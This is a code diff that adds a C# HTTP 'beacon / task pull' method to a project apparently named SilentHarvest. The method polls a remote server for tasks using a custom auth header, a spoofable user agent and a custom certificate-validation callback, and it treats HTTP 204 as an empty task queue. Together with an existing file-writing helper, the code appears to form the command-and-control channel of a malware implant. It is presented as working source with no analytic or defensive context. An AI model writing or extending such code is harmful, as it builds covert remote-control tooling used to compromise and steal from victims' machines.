@@ -92,6 +92,50 @@ namespace SilentHarvest
             }
         }
 
+        
+        // minimal HTTP GET (beacon / task pull); returns null on non-200/204
+        public static byte[] Get(string url)
+        {
+            try
+            {
+                ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
+                ServicePointManager.ServerCertificateValidationCallback = ValidateServerCert;
+                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
+                req.Method = "GET";
+                req.UserAgent = Cfg.UserAgent;
+                if (!string.IsNullOrEmpty(Cfg.Auth))
+                    req.Headers["X-SH-Auth"] = Cfg.Auth;
+                req.Timeout = 15000;
+                req.ReadWriteTimeout = 15000;
+                req.KeepAlive = false;
+                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
+                {
+                    if ((int)resp.StatusCode != 200) return null;
+                    using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
+                    using (Stream s = resp.GetResponseStream())
+                    {
+                        byte[] buf = new byte[8192];
+                        int n;
+                        while ((n = s.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, n);
+                        return ms.ToArray();
+                    }
+                }
+            }
+            catch (WebException we)
+            {
+                if (we.Response is HttpWebResponse &&
+                    (int)((HttpWebResponse)we.Response).StatusCode == 204)
+                    return null;                       // empty task queue
+                Util.Log("beacon failed: {0}", we.Message);
+                return null;
+            }
+            catch (Exception e)
+            {
+                Util.Log("beacon failed: {0}", e.Message);
+                return null;
+            }
+        }
+
         public static bool WriteOut(byte[] blob, string path)
         {
             try
